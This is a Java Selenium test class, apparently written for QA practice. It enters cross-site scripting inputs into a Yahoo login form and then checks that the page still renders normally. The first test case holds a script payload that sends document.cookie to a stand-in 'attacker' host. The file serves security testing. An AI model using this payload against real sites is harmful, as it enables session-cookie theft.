package Home_Page;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.By;
import static org.junit.Assert.assertTrue;



public class xssAttack {
    private static WebDriver driver = null;

    public static void main(String[] args) throws InterruptedException {

        driver = new ChromeDriver ();

        //driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);

        driver.get("set your yahoo url");

        //TC01
        Home_Page.txtbx_UserName(driver).sendKeys("<script>\n" +
                "window.location='http://attacker/?cookie='+document.cookie\n" +
                "</script>");
        Home_Page.Submit_Btn(driver).click();
        Thread.sleep ( 5000 );
        String actualString = driver.findElement(By.xpath("//*[@id='mbr-forgot-link']")).getText();

        String expectedString = "Αντιμετωπίζετε πρόβλημα με τη σύνδεση;";

        assertTrue(actualString.contains(expectedString));

        //TC02
        Home_Page.txtbx_UserName(driver).clear ();
        Home_Page.txtbx_UserName(driver).sendKeys("print \"<html>\"\n" +
                "print \"Latest comment:\"\n" +
               "print database.latestComment\n" +
                "print \"</html>\"");
        Home_Page.Submit_Btn(driver).click();
        Thread.sleep ( 5000 );
        String actualString2 = driver.findElement(By.xpath("//*[@id='mbr-forgot-link']")).getText();
        String expectedString2 = "Αντιμετωπίζετε πρόβλημα με τη σύνδεση;";
        assertTrue(actualString2.contains(expectedString2));
        driver.quit();

    }
}
